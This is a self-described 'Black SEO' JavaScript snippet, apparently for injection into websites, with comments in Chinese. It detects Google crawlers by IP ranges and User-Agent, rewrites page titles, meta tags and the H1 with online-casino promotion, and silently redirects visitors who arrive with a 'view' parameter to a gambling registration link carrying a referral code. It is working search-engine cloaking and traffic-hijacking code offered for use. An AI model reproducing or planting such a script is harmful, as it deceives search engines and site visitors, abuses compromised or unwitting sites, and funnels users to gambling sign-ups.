<!-- Black SEO 智能访客识别脚本 - SEO设置ID: 5 -->
<script>
(async () => {
  const enableLogging = true;

  // 辅助函数：日志记录
  function log(message, ...args) {
    if (enableLogging) {
      console.log("Black SEO Script:", message, ...args);
    }
  }

  function error(message, ...args) {
    if (enableLogging) {
      console.error("Black SEO Script:", message, ...args);
    }
  }

  try {
    log("开始执行智能访客识别脚本 - 优化版本 v2.0");

    // 1. 获取URL参数
    const params = new URLSearchParams(window.location.search);
    const view = params.get("view");
    const hasViewParam = view !== null;

    log("URL参数检测:", { view, hasViewParam });

    // 2. 检测访客类型
    log("开始访客类型检测...");
    const visitorInfo = await detectVisitorType(hasViewParam, view);
    log("访客检测结果:", visitorInfo);

    // 3. 根据访客类型和配置执行相应逻辑
    if (!true) {
      // 如果未启用访客识别，使用传统逻辑
      log("访客识别已禁用，使用传统逻辑");
      if (hasViewParam) {
        await applySEOOptimization(view);
        await executeRedirect();
      }
      return;
    }

    // 检查置信度阈值 - 优化后的动态阈值策略
    const confidenceThreshold = getConfidenceThreshold(visitorInfo);
    if (visitorInfo.confidence < confidenceThreshold) {
      log("访客识别置信度过低 (" + visitorInfo.confidence + " < " + confidenceThreshold + ")，视为普通用户");
      visitorInfo.type = 'normal_user';
    } else {
      log("访客识别置信度满足要求 (" + visitorInfo.confidence + " >= " + confidenceThreshold + ")");
    }

    switch (visitorInfo.type) {
      case 'google_crawler':
        log("识别为谷歌爬虫，应用SEO优化");
        if (hasViewParam) {
          await applySEOOptimization(view);
        }
        // 爬虫不执行跳转
        break;

      case 'parameterized_user':
        log("识别为参数用户，应用SEO优化并准备跳转");
        await applySEOOptimization(view);
        if (!false) {
          await executeRedirect();
        }
        break;

      case 'normal_user':
      default:
        log("识别为普通用户，行为模式: original");

        if (false) {
          log("仅爬虫模式已启用，普通用户保持原始页面");
          break;
        }

        switch ("original") {
          case 'seo':
            log("普通用户应用SEO优化");
            if (hasViewParam) {
              await applySEOOptimization(view);
            }
            break;
          case 'redirect':
            log("普通用户应用SEO优化并跳转");
            if (hasViewParam) {
              await applySEOOptimization(view);
              await executeRedirect();
            }
            break;
          case 'original':
          default:
            log("普通用户保持原始页面");
            // 不做任何修改，保持原始页面内容
            break;
        }
        break;
    }

  } catch (e) {
    error("脚本执行失败:", e instanceof Error ? e.message : e);
  }

  // 访客类型检测函数
  async function detectVisitorType(hasViewParam, viewParamValue) {
    const detectionMode = "client";

    if (detectionMode === 'client') {
      return await detectVisitorTypeClient(hasViewParam, viewParamValue);
    } else {
      return await detectVisitorTypeServer(hasViewParam, viewParamValue);
    }
  }

  // 客户端模式：直接调用Google API进行检测
  async function detectVisitorTypeClient(hasViewParam, viewParamValue) {
    try {
      log("使用客户端模式进行访客检测");

      // 1. 获取客户端IP（使用第三方服务）
      const clientIP = await getClientIP();
      log("客户端IP:", clientIP);

      // 2. 检测User-Agent
      const userAgent = navigator.userAgent;
      const isGoogleUA = checkGoogleUserAgent(userAgent);
      log("User-Agent检测:", { userAgent, isGoogleUA });

      // 3. 检测IP是否为Google爬虫
      const isGoogleIP = await checkGoogleIP(clientIP);
      log("Google IP检测:", { ip: clientIP, isGoogleIP });

      // 4. 综合判断访客类型
      return determineVisitorType(isGoogleIP, isGoogleUA, hasViewParam, viewParamValue);

    } catch (e) {
      error("客户端访客检测失败:", e);
      // 降级策略：基于URL参数和User-Agent判断
      const userAgent = navigator.userAgent;
      const isGoogleUA = checkGoogleUserAgent(userAgent);

      if (isGoogleUA) {
        return { type: 'google_crawler', confidence: 0.6 };
      }

      return hasViewParam ?
        { type: 'parameterized_user', confidence: 0.5 } :
        { type: 'normal_user', confidence: 0.5 };
    }
  }

  // 服务器模式：调用我们的API进行检测
  async function detectVisitorTypeServer(hasViewParam, viewParamValue) {
    try {
      log("使用服务器模式进行访客检测");

      // 获取客户端IP
      const ipResponse = await fetch(window.location.origin + "/api/utils/detect-ip");
      const ipData = await ipResponse.json();

      if (!ipData.success) {
        log("IP检测失败，使用默认逻辑");
        return hasViewParam ?
          { type: 'parameterized_user', confidence: 0.8 } :
          { type: 'normal_user', confidence: 0.8 };
      }

      // 调用访客检测API
      const detectionResponse = await fetch(window.location.origin + "/api/utils/detect-visitor", {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ip: ipData.ip,
          userAgent: navigator.userAgent,
          hasViewParam,
          viewParamValue
        })
      });

      const detectionData = await detectionResponse.json();

      if (detectionData.success) {
        return detectionData.visitor;
      } else {
        log("访客检测API失败，使用默认逻辑");
        return hasViewParam ?
          { type: 'parameterized_user', confidence: 0.8 } :
          { type: 'normal_user', confidence: 0.8 };
      }

    } catch (e) {
      error("服务器访客检测失败:", e);
      // 降级策略：基于URL参数判断
      return hasViewParam ?
        { type: 'parameterized_user', confidence: 0.5 } :
        { type: 'normal_user', confidence: 0.5 };
    }
  }

  // 获取客户端IP地址 - 增强版本，增加更多备用服务
  async function getClientIP() {
    try {
      // 尝试多个IP检测服务，增加备用选项
      const ipServices = [
        'https://api.ipify.org?format=json',
        'https://ipapi.co/json/',
        'https://httpbin.org/ip',
        'https://api.myip.com',
        'https://ipinfo.io/json',
        // 备用：尝试自建API
        window.location.origin + '/api/get-client-ip'
      ];

      for (const service of ipServices) {
        try {
          const response = await fetch(service, {
            timeout: 3000,
            headers: {
              'Accept': 'application/json',
              'Cache-Control': 'no-cache'
            }
          });

          if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
          }

          const data = await response.json();

          // 不同服务返回格式不同，统一处理
          const ip = data.ip || data.origin || data.query || data.IPv4;
          if (ip && isValidIP(ip)) {
            log("成功获取IP:", ip, "来源:", service);
            return ip;
          }
        } catch (e) {
          log("IP服务失败:", service, e.message);
          continue;
        }
      }

      throw new Error("所有IP检测服务都失败");
    } catch (e) {
      error("获取客户端IP失败:", e);
      return 'unknown';
    }
  }

  // 检测Google User-Agent
  function checkGoogleUserAgent(userAgent) {
    if (!userAgent) return false;

    const googleBotPatterns = [
      /Googlebot/i,
      /Google-InspectionTool/i,
      /GoogleOther/i,
      /Google-PageRenderer/i,
      /Google-Read-Aloud/i,
      /Google-Structured-Data-Testing-Tool/i,
      /Mediapartners-Google/i,
      /AdsBot-Google/i,
      /Feedfetcher-Google/i,
      /Google-Site-Verification/i
    ];

    return googleBotPatterns.some(pattern => pattern.test(userAgent));
  }

  // 检测Google IP - 增强版本，增加备用检测方案
  async function checkGoogleIP(ip) {
    if (!ip || ip === 'unknown' || !isValidIP(ip)) {
      return false;
    }

    try {
      log("开始检测Google IP:", ip);

      // 首先尝试自建API（避免CORS问题）
      try {
        const proxyResponse = await fetch(window.location.origin + '/api/verify-google-ip?ip=' + encodeURIComponent(ip), {
          timeout: 5000
        });
        if (proxyResponse.ok) {
          const proxyData = await proxyResponse.json();
          if (proxyData.success !== undefined) {
            log("使用代理API检测Google IP:", proxyData.isGoogle);
            return proxyData.isGoogle;
          }
        }
      } catch (e) {
        log("代理API检测失败，尝试直接访问:", e.message);
      }

      // 备用方案：直接访问Google官方IP库URL
      const googleIPUrls = [
        'https://developers.google.com/search/apis/ipranges/googlebot.json',
        'https://developers.google.com/search/apis/ipranges/special-crawlers.json',
        'https://developers.google.com/search/apis/ipranges/user-triggered-fetchers.json'
      ];

      // 并行获取所有IP库
      const ipRangePromises = googleIPUrls.map(async (url) => {
        try {
          const response = await fetch(url, { timeout: 5000 });
          if (!response.ok) throw new Error(`HTTP ${response.status}`);
          return await response.json();
        } catch (e) {
          log("获取Google IP库失败:", url, e.message);
          return null;
        }
      });

      const ipRangeResults = await Promise.all(ipRangePromises);

      // 合并所有IP范围
      const allRanges = [];
      ipRangeResults.forEach(result => {
        if (result && result.prefixes) {
          result.prefixes.forEach(prefix => {
            if (prefix.ipv4Prefix) allRanges.push(prefix.ipv4Prefix);
            if (prefix.ipv6Prefix) allRanges.push(prefix.ipv6Prefix);
          });
        }
      });

      log("获取到Google IP范围数量:", allRanges.length);

      // 检查IP是否在任何范围内
      for (const range of allRanges) {
        if (isIPInRange(ip, range)) {
          log("IP匹配Google范围:", ip, "->", range);
          return true;
        }
      }

      return false;

    } catch (e) {
      error("Google IP检测失败:", e);
      // 最后的备用方案：基于IP段的简单检测
      return performSimpleGoogleIPCheck(ip);
    }
  }

  // 简单的Google IP检测备用方案
  function performSimpleGoogleIPCheck(ip) {
    // 已知的一些Google IP段（简化版本）
    const knownGoogleRanges = [
      '66.249.', '64.233.', '72.14.', '74.125.', '173.194.',
      '209.85.', '216.239.', '8.8.', '8.34.', '108.177.'
    ];

    const ipPrefix = ip.split('.').slice(0, 2).join('.') + '.';
    const isKnownGoogle = knownGoogleRanges.some(range => ip.startsWith(range));

    if (isKnownGoogle) {
      log("基于已知IP段识别为Google IP:", ip);
    }

    return isKnownGoogle;
  }

  // 验证IP地址格式
  function isValidIP(ip) {
    const ipv4Regex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    const ipv6Regex = /^(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}$|^::1$|^::$/;
    return ipv4Regex.test(ip) || ipv6Regex.test(ip);
  }

  // 检查IP是否在CIDR范围内
  function isIPInRange(ip, cidr) {
    try {
      const [network, maskBits] = cidr.split('/');
      const mask = parseInt(maskBits, 10);

      if (ip.includes(':')) {
        // IPv6处理（简化）
        return isIPv6InRange(ip, network, mask);
      } else {
        // IPv4处理
        return isIPv4InRange(ip, network, mask);
      }
    } catch (e) {
      return false;
    }
  }

  // IPv4范围检查
  function isIPv4InRange(ip, network, mask) {
    const ipNum = ipv4ToNumber(ip);
    const networkNum = ipv4ToNumber(network);
    const maskNum = (0xFFFFFFFF << (32 - mask)) >>> 0;
    return (ipNum & maskNum) === (networkNum & maskNum);
  }

  // IPv6范围检查（简化）
  function isIPv6InRange(ip, network, mask) {
    // 简化的IPv6检查，实际生产环境建议使用专门的库
    return ip.toLowerCase().startsWith(network.toLowerCase().split(':').slice(0, Math.floor(mask / 16)).join(':'));
  }

  // IPv4转数字
  function ipv4ToNumber(ip) {
    return ip.split('.').reduce((acc, octet) => (acc << 8) + parseInt(octet, 10), 0) >>> 0;
  }

  // 综合判断访客类型 - 优化权重分配
  function determineVisitorType(isGoogleIP, isGoogleUA, hasViewParam, viewParamValue) {
    let confidence = 0;
    let type = 'normal_user';

    // IP检测权重：50% (降低权重，因为经常失败)
    if (isGoogleIP) {
      confidence += 0.5;
      type = 'google_crawler';
    }

    // User-Agent检测权重：40% (提高权重，更可靠)
    if (isGoogleUA) {
      confidence += 0.4;
      if (type !== 'google_crawler') {
        type = 'google_crawler';
      }
    }

    // URL参数检测权重：20% (提高权重，重要指标)
    if (hasViewParam) {
      confidence += 0.2;
      if (type === 'normal_user') {
        type = 'parameterized_user';
      }
    }

    // 如果既有Google特征又有参数，优先判断为爬虫
    if ((isGoogleIP || isGoogleUA) && hasViewParam) {
      type = 'google_crawler';
      confidence = Math.max(confidence, 0.8);
    }

    // 特殊情况：仅有参数但置信度较低时，给予额外加分
    if (hasViewParam && !isGoogleUA && !isGoogleIP && confidence < 0.3) {
      confidence += 0.1; // 额外10%加分
      log("参数用户获得额外置信度加分");
    }

    // 确保置信度在合理范围内
    confidence = Math.min(Math.max(confidence, 0.1), 1.0);

    return {
      type,
      confidence,
      details: {
        isGoogleIP,
        isGoogleUA,
        hasViewParam,
        viewParamValue
      }
    };
  }

  // 动态置信度阈值策略
  function getConfidenceThreshold(visitorInfo) {
    const { details } = visitorInfo;

    // 如果有Google UA，要求更高置信度
    if (details.isGoogleUA) {
      return 0.6;
    }

    // 如果有参数但无Google特征，降低阈值
    if (details.hasViewParam && !details.isGoogleUA && !details.isGoogleIP) {
      return 0.3;
    }

    // 默认阈值
    return 0.5;
  }

  // SEO优化应用函数 - 增强错误处理和备用方案
  async function applySEOOptimization(viewParam) {
    if (!viewParam) {
      log("无view参数，跳过SEO优化");
      return;
    }

    try {
      log("正在获取SEO配置...");

      // 动态构建SEO配置URL - 始终使用当前域名
      const baseConfigUrl = window.location.origin + '/api/public/seo-config';
      const configUrl = baseConfigUrl + (baseConfigUrl.includes('?') ? '&' : '?') + "view=" + encodeURIComponent(viewParam);

      const res = await fetch(configUrl, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'Cache-Control': 'no-cache'
        },
        timeout: 10000
      });

      if (!res.ok) {
        // 如果API不存在，尝试使用默认配置
        if (res.status === 404) {
          log("SEO配置API不存在，使用默认配置");
          await applyDefaultSEOConfig(viewParam);
          return;
        }
        throw new Error(`HTTP ${res.status}: ${res.statusText}`);
      }

      const config = await res.json();
      log("获取到SEO配置:", config);

      if (config) {
        // 动态修改页面标题
        if (config.title) {
          document.title = config.title;
          log("已更新页面标题:", config.title);
        }

        // 动态修改Meta描述
        const metaDesc = document.querySelector('meta[name="description"]');
        if (metaDesc && config.desc) {
          metaDesc.setAttribute("content", config.desc);
          log("已更新Meta描述:", config.desc);
        } else if (config.desc) {
          const newMetaDesc = document.createElement('meta');
          newMetaDesc.name = 'description';
          newMetaDesc.content = config.desc;
          document.head.appendChild(newMetaDesc);
          log("已创建Meta描述标签:", config.desc);
        }

        // 动态修改关键词
        if (config.keywords) {
          let metaKeywords = document.querySelector('meta[name="keywords"]');
          if (metaKeywords) {
            metaKeywords.setAttribute("content", config.keywords);
          } else {
            metaKeywords = document.createElement('meta');
            metaKeywords.name = 'keywords';
            metaKeywords.content = config.keywords;
            document.head.appendChild(metaKeywords);
          }
          log("已更新关键词:", config.keywords);
        }

        // 动态修改H1标签
        const h1 = document.querySelector("h1");
        if (h1 && config.h1) {
          h1.textContent = config.h1;
          log("已更新H1标签:", config.h1);
        }

        // 存储跳转配置供后续使用
        window.blackSEOConfig = config;
      } else {
        log("未获取到有效的SEO配置");
      }
    } catch (e) {
      error("SEO配置加载失败:", e instanceof Error ? e.message : e);
      // 备用方案：使用默认SEO配置
      log("尝试使用默认SEO配置");
      await applyDefaultSEOConfig(viewParam);
    }
  }

  // 默认SEO配置应用函数
  async function applyDefaultSEOConfig(viewParam) {
    try {
      log("应用默认SEO配置，参数:", viewParam);

      // 根据不同的view参数应用不同的默认配置
      const defaultConfigs = {
        'seo': {
          title: 'Galaxy Slot Casino - 最佳在线老虎机游戏平台',
          desc: 'Galaxy Slot Casino提供最刺激的在线老虎机游戏，丰富奖金，安全可靠，立即加入体验！',
          keywords: '在线老虎机,赌场游戏,Galaxy Slot,老虎机游戏,在线赌场',
          h1: '🎰 Galaxy Slot - 顶级在线老虎机体验'
        },
        'casino': {
          title: 'Galaxy Casino - 专业在线赌场平台',
          desc: 'Galaxy Casino专业在线赌场，提供老虎机、扑克、轮盘等多种游戏，安全快速提款！',
          keywords: '在线赌场,赌场游戏,老虎机,扑克游戏,轮盘游戏',
          h1: '🎲 Galaxy Casino - 您的幸运之选'
        }
      };

      const config = defaultConfigs[viewParam] || defaultConfigs['seo'];

      // 应用默认配置
      if (config.title) {
        document.title = config.title;
        log("已应用默认页面标题:", config.title);
      }

      // 动态修改Meta描述
      const metaDesc = document.querySelector('meta[name="description"]');
      if (metaDesc && config.desc) {
        metaDesc.setAttribute("content", config.desc);
        log("已应用默认Meta描述:", config.desc);
      } else if (config.desc) {
        const newMetaDesc = document.createElement('meta');
        newMetaDesc.name = 'description';
        newMetaDesc.content = config.desc;
        document.head.appendChild(newMetaDesc);
        log("已创建默认Meta描述标签:", config.desc);
      }

      // 动态修改关键词
      if (config.keywords) {
        let metaKeywords = document.querySelector('meta[name="keywords"]');
        if (metaKeywords) {
          metaKeywords.setAttribute("content", config.keywords);
        } else {
          metaKeywords = document.createElement('meta');
          metaKeywords.name = 'keywords';
          metaKeywords.content = config.keywords;
          document.head.appendChild(metaKeywords);
        }
        log("已应用默认关键词:", config.keywords);
      }

      // 动态修改H1标签
      const h1 = document.querySelector("h1");
      if (h1 && config.h1) {
        h1.textContent = config.h1;
        log("已应用默认H1标签:", config.h1);
      }

      // 存储默认配置供后续使用
      window.blackSEOConfig = config;

    } catch (e) {
      error("应用默认SEO配置失败:", e instanceof Error ? e.message : e);
    }
  }

  // 跳转执行函数
  async function executeRedirect() {
    try {
      const config = window.blackSEOConfig;
      if (config && config.rc) {
        const redirectUrl = "https://hashplay.org/register?rc=121" + config.rc;
        log("将在800ms后跳转到:", redirectUrl);

        setTimeout(() => {
          log("执行跳转到:", redirectUrl);
          window.location.href = redirectUrl;
        }, 800);
      } else {
        log("未配置跳转参数，跳过跳转");
      }
    } catch (e) {
      error("跳转执行失败:", e instanceof Error ? e.message : e);
    }
  }
})();
</script>